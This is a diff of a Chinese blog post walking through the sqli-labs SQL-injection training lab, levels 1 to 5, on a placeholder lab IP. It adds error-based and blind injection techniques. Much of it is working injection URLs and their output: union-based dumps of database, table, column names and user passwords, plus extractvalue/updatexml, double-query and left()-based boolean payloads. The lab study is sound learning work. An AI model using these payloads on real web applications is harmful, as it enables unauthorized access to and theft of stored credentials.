@@ -4,7 +4,7 @@
 
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="Sqli-labs训练营, web安全,web攻防,blog,shell,linux,windows,Linux,Windows,物理,物理学,宇宙,反物质,字星河,博客,星河,Enomothem,enomothem,eonthem">
+    <meta name="keywords" content="Sqli-labs训练营[1-6], web安全,web攻防,blog,shell,linux,windows,Linux,Windows,物理,物理学,宇宙,反物质,字星河,博客,星河,Enomothem,enomothem,eonthem">
     <meta name="description" content="真正的改变只能发生在原则层面">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>Sqli-labs训练营 | 字星河</title>
+    <title>Sqli-labs训练营[1-6] | 字星河</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/enomothem/cdn@1.5.0/sources/libs/awesome/css/all.css">
@@ -480,12 +480,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/enomothem/cdn@1.5.0/sources/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430011532521.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Sqli-labs训练营</h1>
+                    <h1 class="description center-align post-title">Sqli-labs训练营[1-6]</h1>
                 </div>
             </div>
         </div>
@@ -633,21 +633,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-29
+                    2022-04-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.9k
+                    6.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    31 分
                 </div>
                 
 
@@ -667,8 +667,9 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><blockquote>
-<p>为了防止内网IP泄露，以下靶场搭建以192.168.0.666为例。</p>
+                <p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430011532521.png"></p>
+<h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><blockquote>
+<p>为了防止内网IP泄露，以下靶场搭建以一个不存在的IP192.168.0.666为例。</p>
 </blockquote>
 <p>这是一个很老的SQL注入靶场了，2011年就有了，SQLI 实验室测试基于错误、基于布尔值、基于时间的注入漏洞。</p>
 <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
@@ -685,7 +686,7 @@
 <p>数据库相关概念，如数据库、表、字段等参考数据库的文章。</p>
 <p><a href="https://enomothem.com/posts/2af3.html">相关SQL命令</a></p>
 <h4 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h4><p>一共4页，第一页是基本挑战，1-21关。第二页高级进阶，22-37关。第三页堆叠注入，38-53关。最后一页挑战，54-75关。</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429125019601.png" alt="image-20220429125019601"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429125019601.png"></p>
 <h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>准备工具SQLmap、Firefox和Hackbar组件。</p>
 <h4 id="Mysql元数据"><a href="#Mysql元数据" class="headerlink" title="Mysql元数据"></a>Mysql元数据</h4><pre class=" language-txt"><code class="language-txt">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
 
@@ -730,17 +731,17 @@ version<span class="token punctuation">(</span><span class="token punctuation">)
 <p>为了直观观察，用代码块代替图片的显示。</p>
 </blockquote>
 <h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p><strong>》交互测试</strong></p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429125406611.png" alt="欢迎页面"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429125658707.png"></p>
 <p><strong>》提示ID参数</strong></p>
 <p><code>http://192.168.0.666/Less-1/?id=1</code></p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429125658707.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429125658707.png"></p>
 <p><code>http://192.168.0.666/Less-1/?id=1'</code>，报错</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429130515771.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429130515771.png"></p>
 <p><strong>》注释</strong></p>
 <p><code>http://192.168.0.666/Less-1/?id=1'#</code> 不行</p>
 <p><code>http://192.168.0.666/Less-1/?id=1'--+</code> 可以</p>
 <p><code>http://192.168.0.666/Less-1/?id=1'%23</code> 可以</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429130723033.png" alt="注释"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429130723033.png"></p>
 <p><strong>》Order by字段</strong></p>
 <p>依次尝试1，2，3，4，发现4报错，说明有三个字段。</p>
 <p><code>http://192.168.0.666/Less-1/?id=1' order by 1%23</code><br><code>http://192.168.0.666/Less-1/?id=1' order by 2%23</code><br><code>http://192.168.0.666/Less-1/?id=1' order by 3%23</code><br><code>http://192.168.0.666/Less-1/?id=1' order by 4%23</code> 报错了</p>
@@ -768,21 +769,21 @@ Your Password:<span class="token number">3</span>
 Your Password:<span class="token number">5.5</span><span class="token punctuation">.</span><span class="token number">53</span>
 </code></pre>
 <p><code>http://192.168.0.666/Less-1/?id=-1'union select 1,schema_name,3 from information_schema.schemata%23</code>所有数据库</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429141542989.png" alt="image-20220429141542989"></p>
+<p>!(<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429141542989.png">https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429141542989.png</a>)</p>
 <p><code>http://192.168.0.666/Less-1/?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code> 所有数据库(聚合)</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429140239212.png" alt="image-20220429140239212"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429140239212.png"></p>
 <blockquote>
 <p>这里使用了group_concat()聚合在一起，这样就不会被limit限制。</p>
 </blockquote>
 <p><strong>》获取表</strong></p>
 <p><code>http://192.168.0.666/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'%23</code></p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429141252697.png" alt="image-20220429141252697"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429141252697.png"></p>
 <p><strong>》获取字段</strong></p>
 <p><code>http://192.168.0.666/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'%23</code></p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429142027896.png" alt="image-20220429142027896"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429142351183.png"></p>
 <p><strong>》获取数据</strong></p>
 <p><code>http://192.168.0.666/Less-1/?id=-1' union select 1,username,password from users where id=3 %23</code></p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429142351183.png" alt="image-20220429142351183"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429142351183.png"></p>
 <p>到这里，你的目的也就达到了。</p>
 <h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><blockquote>
 <p>Please input the ID as parameter with numeric value.</p>
@@ -793,9 +794,9 @@ Your Password:<span class="token number">5.5</span><span class="token punctuatio
 </blockquote>
 <p>我们直接按照第一关的步骤哒哒哒直接到最后获取数据吧。</p>
 <p><code>http://192.168.0.666/Less-2/?id=-1 union select 1,username,password from users where id=3 %23</code></p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429144321788.png" alt="image-20220429144321788"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429144321788.png"></p>
 <h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p><code>http://192.168.0.666/Less-3/?id=1'</code> 报错，发现一个出现了一个右括号，审查源码。</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429145627807.png" alt="image-20220429145627807"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429145627807.png"></p>
 <p><strong>》源代码</strong></p>
 <pre class=" language-sql"><code class="language-sql">$sql<span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span><span class="token punctuation">;</span>
 $result<span class="token operator">=</span>mysql_query<span class="token punctuation">(</span>$sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -804,7 +805,7 @@ $<span class="token keyword">row</span> <span class="token operator">=</span> my
 <p><code>http://192.168.0.666/Less-3/?id=1')%23</code> 闭合成功</p>
 <p><code>http://192.168.0.666/Less-3/?id=-1') union select 1,username,password from users where id=3 %23</code></p>
 <p>直接获取用户数据，也OK，结束。</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429150411611.png" alt="image-20220429150411611"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429150411611.png"></p>
 <h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p><code>http://192.168.0.666/Less-4/?id=1'</code> 啥也没变啊，不好使了老铁</p>
 <p><code>http://192.168.0.666/Less-4/?id=1"</code> 双引号，它报错了它报错了！它报它报错了错了（双写版本哈哈哈）~</p>
 <pre class=" language-sql"><code class="language-sql">You have an error <span class="token operator">in</span> your SQL syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'"1"") LIMIT 0,1'</span> at line <span class="token number">1</span>
@@ -812,10 +813,24 @@ $<span class="token keyword">row</span> <span class="token operator">=</span> my
 <p>注意这里的报错显示”1”后面还是加了），所以我们还是需要这个括号的。</p>
 <p><code>http://192.168.0.666/Less-4/?id=1") %23</code> 回显正常</p>
 <p><code>http://192.168.0.666/Less-4/?id=-1") union select 1,username,password from users where id=3 %23</code> 查询用户数据也正常。</p>
-<p><img src="C:\Users\Enomothem\AppData\Roaming\Typora\typora-user-images\image-20220429152314711.png" alt="image-20220429152314711"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429152314711.png"></p>
 <h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><blockquote>
 <p>这一关就不一样了，页面只显示一个You are in …</p>
 </blockquote>
+<p><strong>》判断注入类型</strong></p>
+<p><code>http://192.168.0.666/Less-5/?id=1' and 1=1 %23</code> 正常页面</p>
+<p><code>http://192.168.0.666/Less-5/?id=1' and 1=2 %23</code> 无回显</p>
+<p>通过 ‘ 闭合查询无返回的数据，无论是有数据返回还是无数据返回页面都不会显示相关的数据。我们想到了盲注。</p>
+<p> <strong>盲注分为三类：</strong></p>
+<p>​    <strong>•基于布尔 SQL 盲注</strong></p>
+<p>​    <strong>•基于时间的 SQL 盲注</strong></p>
+<p>​    <strong>•基于报错的 SQL 盲注</strong></p>
+<p>​        1.双查询注入 <a target="_blank" rel="noopener" href="https://blog.csdn.net/xiayun1995/article/details/86512290?spm=1001.2014.3001.5506">原理链接</a></p>
+<p>​        2.使用exp注入（版本在 5.5.5 及其以上）<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html">原理链接</a></p>
+<p>​        3.使用bigint注入(版本在 5.5.5 及其以上）<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509112.html">原理链接</a></p>
+<p>​        4.extractvalue函数错误 </p>
+<p>​        5.updatexml函数错误 </p>
+<p>​        6.mysql 重复特性</p>
 <p>这一题使用Double Injection，双查询注入。就是Select中嵌套一个select，这不就是子查询吗。</p>
 <pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
@@ -827,8 +842,361 @@ $<span class="token keyword">row</span> <span class="token operator">=</span> my
 <span class="token number">4</span> floor<span class="token punctuation">(</span><span class="token punctuation">)</span>取整
 </code></pre>
 <p>原理就是count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
-<p><code>http://192.168.0.666/Less-5/?id=1' and 1=1 %23</code> 正常页面</p>
-<p><code>http://192.168.0.666/Less-5/?id=1' and 1=2 %23</code> 无回显</p>
+<p>Pyload</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span><span class="token number">a</span><span class="token punctuation">)</span>
+</code></pre>
+<p><strong>》获取库名</strong></p>
+<p><code>http://192.168.0.666/Less-5/?id=-1'union select 1,count(*), concat('^',(select database()),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code>  要多点几下</p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+Duplicate entry <span class="token string">'^security^1'</span> <span class="token keyword">for</span> <span class="token keyword">key</span> <span class="token string">'group_key'</span>
+</code></pre>
+<blockquote>
+<p>去掉随机数0就是我们需要的库名了。这里也用^去分隔了。</p>
+</blockquote>
+<p><strong>》获取表</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=-1' union select 1,count(*), concat('^',(select concat(table_name) from information_schema.tables where table_schema=database()),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code>  报错超过一行了</p>
+<pre class=" language-sql"><code class="language-sql">Subquery <span class="token keyword">returns</span> more than <span class="token number">1</span> <span class="token keyword">row</span>
+</code></pre>
+<p>看来我们不能再用concat函数了，换成limit 0,1一个一个输出。</p>
+<p><code>http://192.168.0.666/Less-5?id=-1' union select 1,count(*), concat('^',(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+Duplicate entry <span class="token string">'^emails^1'</span> <span class="token keyword">for</span> <span class="token keyword">key</span> <span class="token string">'group_key'</span>
+</code></pre>
+<p><code>http://192.168.0.666/Less-5?id=-1' union select 1,count(*), concat('^',(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+Duplicate entry <span class="token string">'^users^1'</span> <span class="token keyword">for</span> <span class="token keyword">key</span> <span class="token string">'group_key'</span>
+</code></pre>
+<p><strong>》获取字段</strong></p>
+<blockquote>
+<p>字段也是用limit的思路一个一个猜</p>
+</blockquote>
+<p><code>http://192.168.0.666/Less-5?id=-1' union select 1,count(*), concat('^',(select concat(column_name) from information_schema.columns where table_name='users' limit 1,1),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Duplicate entry <span class="token string">'^first_name^1'</span> <span class="token keyword">for</span> <span class="token keyword">key</span> <span class="token string">'group_key'</span>
+</code></pre>
+<p><font color="red" size="12">我寻思着不对劲啊，？？？</font></p>
+<p><font color="red" size="4">我记得Users下没有first_name字段啊，我的username呢？？</font></p>
+<blockquote>
+<p>原来是少写了数据库了，指定数据库之后就出来了，傻逼了。</p>
+</blockquote>
+<p><code>http://192.168.0.666/Less-5?id=-1' union select count(*),1, concat('^',(select concat(column_name) from information_schema.columns where table_schema='security' and  table_name='users' limit 1,1),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+Duplicate entry <span class="token string">'^username^0'</span> <span class="token keyword">for</span> <span class="token keyword">key</span> <span class="token string">'group_key'</span>
+</code></pre>
+<p><strong>》获取数据</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=-1' union select count(*),1, concat('^',(select concat(username,0x3a,password) from users limit 0,1),'^',floor(rand()*2)) a from information_schema.tables group by a %23</code> 得到数据，结束。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429213553959.png"></p>
+<p>嘛跌嘛跌，还有别的方法还没试。</p>
+<p><strong>方法二 exp注入</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' union select 1,2, exp(~(select * from (select version()) a )) %23</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429214613004.png"></p>
+<blockquote>
+<p>这个版本已经被修复了</p>
+</blockquote>
+<p><strong>方法三 函数报错</strong></p>
+<p><strong>extractvaluel函数错误</strong> </p>
+<p><strong>》获取库名</strong></p>
+<pre class=" language-sql"><code class="language-sql">extractvalue<span class="token punctuation">(</span><span class="token string">'XML_document'</span><span class="token punctuation">,</span><span class="token string">'Xpath_string'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">//即</span>
+extractvalue<span class="token punctuation">(</span><span class="token string">'目标xml文件名'</span><span class="token punctuation">,</span><span class="token string">'在xml中查询的字符串'</span><span class="token punctuation">)</span>
+</code></pre>
+<p>看得出来第二个参数要求的是Xpath格式的字符串，语法正确是会按照路径/该xml文件/要查询的字符串进行查询，如果我们输入的Xpath_string不对就会报错，而如果页面回显sql报错信息就可以得到我们想要的信息了。此处的XML_document可以是anything。</p>
+<p><code>http://192.168.0.666/Less-5?id=1' and extractvalue(1,concat(1,database()))%23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'security'</span>
+</code></pre>
+<p><strong>》获取表</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' and extractvalue(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='security')))%23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'emails,referers,uagents,users'</span>
+</code></pre>
+<p><strong>》获取字段</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' and extractvalue(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'))) %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'id,username,password'</span>
+</code></pre>
+<p><strong>》获取数据</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' and extractvalue(1,concat(1,(select concat((select group_concat(username) from users),'~',(select group_concat(password) from users))))) %23 </code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'Dumb,Angelina,Dummy,secure,stupi'</span>
+</code></pre>
+<blockquote>
+<p>注意：<strong>extractvalue函数一次只能查询32位长度，所以数据未显示全，改用limit控制数据一个一个查询</strong></p>
+</blockquote>
+<p><code>http://192.168.0.666/Less-5?id=1' and extractvalue(1,concat(1,(select concat((select username from users limit 0,1),'~',(select password from users limit 0,1))))) %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'Dumb~Dumb'</span>
+</code></pre>
+<p><strong>updatexml函数错误</strong> </p>
+<p>语法格式</p>
+<pre class=" language-sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token string">'XML_document'</span><span class="token punctuation">,</span><span class="token string">'Xpath_string'</span><span class="token punctuation">,</span><span class="token string">'New_value'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">//即</span>
+updatexml<span class="token punctuation">(</span><span class="token string">'目标xml文件名'</span><span class="token punctuation">,</span><span class="token string">'在xml中查询的字符串'</span><span class="token punctuation">,</span><span class="token string">'替换后的值'</span><span class="token punctuation">)</span>
+</code></pre>
+<p><strong>》获取库</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' union select 1,2,(updatexml(1,concat(1,database()),1)) %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'security'</span>
+</code></pre>
+<p><strong>》获取表</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' union select 1,2,(updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1)) %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'emails,referers,uagents,users'</span>
+</code></pre>
+<p><strong>》获取字段</strong></p>
+<p><code>http://192.168.0.666/Less-5?id=1' union select 1,2,(updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),1)) %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'id,username,password'</span>
+</code></pre>
+<p>》获取数据</p>
+<p><code>http://192.168.0.666/Less-5?id=1' union select 1,2,(updatexml(1,concat(1,(select username from users limit 0,1),1,(select password from users limit 0,1)),1)) %23</code></p>
+<pre class=" language-sql"><code class="language-sql">Welcome    Dhakkan
+XPATH syntax error: <span class="token string">'Dumb1Dumb'</span>
+</code></pre>
+<p><strong>利用Mysql的重复特性</strong></p>
+<blockquote>
+<p>只能查版本，不能查普通语句</p>
+</blockquote>
+<p><code>http://192.168.0.666/Less-5/?id=1' union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) a %23</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220429225946692.png"></p>
+<p><strong>方法四 盲注</strong></p>
+<p>这里提一下盲注原理：盲注不像联合注入和报错注入那样可以参考回显的错误信息，没有错误回显。也就是说在注入攻击中，是要去猜测，分为根据布尔型的True和False和根据时间型的时间差来猜测。</p>
+<p>需要用到的函数：</p>
+<pre class=" language-sql"><code class="language-sql">length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 返回字符串长度</span>
+substr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 截取字符串</span>
+ascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 返回ASCII</span>
+sleep<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 将程序延迟一段时间</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>expr1<span class="token punctuation">,</span>expr2<span class="token punctuation">,</span>expr3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 判断语句</span>
+<span class="token keyword">left</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 取这边字符判断</span>
+<span class="token function">mid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 取中间特定字符判断</span>
+ifnull<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 第一个参数Ture返回，不然返回第二个</span>
+ord<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 第一个字符的ASCII</span>
+<span class="token operator">regexp</span> <span class="token comment" spellcheck="true"># 正则表达</span>
+<span class="token operator">like</span> <span class="token comment" spellcheck="true"># 过滤</span>
+</code></pre>
+<p><strong>LEFT()函数</strong></p>
+<p>left()函数是<strong>字符串函数</strong>（所以首先需要判断是字符型），返回具有指定长度的字符串左边的部分。</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id = 1 and left(database(),1)>'a';
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql> select database();
++------------+
+| database() |
++------------+
+| security   |
++------------+
+1 row in set (0.00 sec)
+
+mysql>
+</code></pre>
+<p>首先这是and执行，所以两边同时要成立，与的逻辑。</p>
+<p>此时Left第一个参数database，第二个参数是1表示第一个参数的第一个字符，这里数据库查询到是security，所以第一个数字表示s，然后我们加入判断是否大于a，显然s&gt;a是成立的，and 前面的id=1也是成立的，所以正常返回了id为1的数据。</p>
+<pre class=" language-mysql"><code class="language-mysql">mysql> select * from users where id = 1 and left(database(),1)>'t';
+Empty set (0.00 sec)
+
+mysql> select * from users where id = 1 and left(database(),1)>'s';
+Empty set (0.00 sec)
+
+mysql> select * from users where id = 1 and left(database(),1)='s';
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+</code></pre>
+<p>s小于t，所以逻辑错误，返回空，s&gt;s，显然也是错的，当s=s时，正常返回了，这里我们就明白这其中利用的原理了。</p>
+<p>回到第五题</p>
+<p><strong>利用left()函数猜测数据库名</strong></p>
+<p>猜测数据库第一个字符</p>
+<p>正常回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430001939707.png"></p>
+<p>异常回显</p>
+<p><img src="https://cdn.jsdelivr.net/gh/enomothem/squarebackets/zixinghe/image-20220430002047346.png"></p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'a' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'b' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'c' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'd' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'e' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'f' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'g' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'h' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'i' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'j' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'k' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'l' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'm' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'n' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'o' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'p' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'q' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 'r' %23 [v] -->表示正常回显
+http://192.168.0.666/Less-5/?id=1' and left(database(),1) > 's' %23 [x] -->表示异常回显
+</code></pre>
+<p>得出第一个字符为<code>s</code></p>
+<hr>
+<p>猜测数据库名第二个字符</p>
+<pre class=" language-mysql"><code class="language-mysql">http://192.168.0.666/Less-5/?id=1' and left(database(),2) > 'sa' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),2) > 'sb' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),2) > 'sc' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),2) > 'sd' %23 [v]
+http://192.168.0.666/Less-5/?id=1' and left(database(),2) > 'se' %23 [x]
+http://192.168.0.666/Less-5/?id=1' and left(database(),2) > 'sf' %23 [x]
+</code></pre>
+<p>得出第二个字符为<code>e</code></p>
+<hr>
+<p>猜测数据库名第三个字符</p>
